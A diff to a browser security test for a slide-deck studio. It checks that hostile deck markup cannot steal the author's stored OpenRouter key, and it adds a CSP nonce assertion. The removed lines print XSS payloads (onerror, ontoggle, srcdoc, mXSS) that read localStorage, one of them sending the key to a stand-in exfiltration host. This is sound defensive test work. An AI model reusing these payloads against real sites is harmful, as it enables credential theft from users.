@@ -1,56 +1,34 @@
+import { BEACON_HOST, HOSTILE, SEEDED_KEY } from './hostile-deck';
 import { storedOpenRouterKey } from './openrouter-key-helper';
 import { expect, gotoStudio, LIVE_PREVIEW, livePreview, test, typeDeck } from './studio-fixture';
 
 // A SHARED DECK CANNOT READ THE AUTHOR'S OPENROUTER KEY.
 //
-// The preview frame is a same-origin, unsandboxed `srcdoc` iframe, and its CSP has no
-// `script-src` (lib/core/subresource-csp.mjs). So the ONE thing between a hostile deck and
-// `localStorage` — where the author's key lives — is `sanitizeSlideHtml`, which
-// `single-slide-render.ts` runs on every slide before it enters the frame. A script that got
-// through could read the key and send it anywhere: `top.location`, `parent.fetch`, a
-// form post. This spec is the real-browser proof, and the evidence that it can fail: with
-// `sanitizeOnce` returning its input unchanged, the test goes red — measured 2026-11-06, the
-// event-handler vectors (img onerror, details ontoggle, iframe srcdoc, onerror after a
-// <style>) read the key. The bare <script> vectors stay inert even unguarded, because the
-// preview inserts markup through paths that do not run <script>; they are kept as a tripwire
-// in case that ever changes. (engineering/decisions/2026-11-06-studio-byok-key-lifecycle.md §4, HARD RULE #22.)
+// The preview frame is a same-origin, unsandboxed `srcdoc` iframe. TWO walls stand between a
+// hostile deck and `localStorage`, where the author's key lives. A script that got past both
+// could read the key and send it anywhere: `top.location`, `parent.fetch`, a form post.
 //
-// Each payload tries to append `<vector>:<key>` to `top.__byokLeak`, and the image vectors
-// also try a beacon to an unroutable host. Typing the deck is how the markup arrives here; a
+//   1. `sanitizeSlideHtml`, which `single-slide-render.ts` runs on every slide before it enters
+//      the frame. This spec drives it.
+//   2. The frame's `script-src 'nonce-…' 'strict-dynamic'` (lib/core/subresource-csp.mjs), which
+//      refuses any inline handler or script the sanitizer missed. This spec checks it is present.
+//
+// Each wall was measured alone, 2026-11-06, by building with `sanitizeOnce` returning its input:
+//   · without the script-src (#3048), this spec went RED: img onerror, details ontoggle, iframe
+//     srcdoc and an onerror after a <style> read the key;
+//   · with it, the spec stays GREEN on desktop and mobile Chromium, Gecko, and WebKit phone and
+//     tablet. The handlers sit in the frame's DOM and the browser refuses to run them.
+// The bare <script> vectors stay inert even unguarded, because the preview inserts markup through
+// paths that do not run <script>; they are kept as a tripwire in case that ever changes.
+// (engineering/decisions/2026-11-06-studio-byok-key-lifecycle.md §4, HARD RULE #22.)
+//
+// The vectors live in `hostile-deck.ts`, shared with `byok-key-isolation-surfaces.spec.ts`. Typing the deck is how the markup arrives here; a
 // deck opened from a share link or a `.lattice` file lands in the same renderer.
-
-const SEEDED_KEY = 'sk-or-e2e-isolation-canary';
-const leak = (tag: string) => `top.__byokLeak=(top.__byokLeak||[]).concat('${tag}:'+localStorage.getItem('lattice-db-or-key'))`;
-
-const HOSTILE = [
-	'# Isolation probe',
-	'',
-	'Probe body text.',
-	'',
-	`<script>${leak('script')}</script>`,
-	'',
-	`<img src="x" onerror="${leak('img-onerror')};new Image().src='https://exfil.invalid/?k='+localStorage.getItem('lattice-db-or-key')">`,
-	'',
-	`<svg onload="${leak('svg-onload')}"><circle r="1"/></svg>`,
-	'',
-	`<svg><script>${leak('svg-script')}</script></svg>`,
-	'',
-	`<details open ontoggle="${leak('details-ontoggle')}"><summary>s</summary>x</details>`,
-	'',
-	`<iframe srcdoc="<script>${leak('iframe-srcdoc').replace(/'/g, '&#39;')}</script>"></iframe>`,
-	'',
-	`<style>section{}</style><img src="x" onerror="${leak('after-style')}">`,
-	'',
-	`<object data="javascript:${leak('object')}"></object>`,
-	'',
-	// LAST: the unclosed mXSS nest swallows whatever follows it, so nothing may come after.
-	`<math><mtext><table><mglyph><style><img src=x onerror="${leak('mxss')}">`,
-].join('\n');
 
 test('@smoke @crosswidth @webkit-phone @webkit-tablet @gecko a hostile deck in the preview cannot read the stored OpenRouter key', async ({ page }) => {
 	test.slow();
 	const beacons: string[] = [];
-	await page.route('https://exfil.invalid/**', async (route) => {
+	await page.route(`${BEACON_HOST}/**`, async (route) => {
 		beacons.push(route.request().url());
 		await route.abort();
 	});
@@ -80,6 +58,11 @@ test('@smoke @crosswidth @webkit-phone @webkit-tablet @gecko a hostile deck in t
 	// image `complete`, so that flag is not the signal. The test's own timeout bounds a hung decode.
 	await frame.locator('img').evaluateAll((imgs) => Promise.allSettled(imgs.map((i) => (i as HTMLImageElement).decode())));
 	await frame.locator('body').evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))));
+
+	// The second wall is in place: the frame's policy refuses any script without the page's nonce.
+	const policy = await frame.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
+	expect(policy, 'the preview frame carries the nonce script-src').toMatch(/script-src 'nonce-[\w-]{16,}' 'strict-dynamic'/);
+	expect(policy).not.toMatch(/unsafe-inline|unsafe-hashes/);
 
 	const leaked = await page.evaluate(() => (window as unknown as { __byokLeak?: string[] }).__byokLeak ?? []);
 	expect(leaked, 'no payload in the deck should run in the preview frame').toEqual([]);
